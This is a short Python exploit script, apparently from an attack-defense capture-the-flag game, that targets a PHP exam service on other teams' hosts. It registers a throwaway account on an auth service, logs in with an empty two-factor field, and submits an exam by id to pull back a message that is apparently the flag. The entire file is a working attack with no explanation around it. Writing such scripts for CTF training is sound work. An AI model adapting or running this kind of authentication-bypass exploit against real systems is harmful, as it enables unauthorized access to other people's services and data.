#!/usr/bin/env python3

import requests
import sys
import os
from service2client import Client as AuthClient

port = 1237


def exploit(ip, id):
    base_addr = f"http://{ip}:{port}"
    username = os.urandom(6).hex()
    password = os.urandom(6).hex()
    c = AuthClient(ip, username, password, "3")
    c.register()
    c.login()
    token = c.get_token()

    sess = requests.Session()
    r = sess.post(base_addr+"/login.php", data={"token": token, "2fa": ""})
    r = sess.post(base_addr+"/exam_submit.php",
                  json={"id": id, "answers": [0]*10})
    return r.json()["msg"]


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
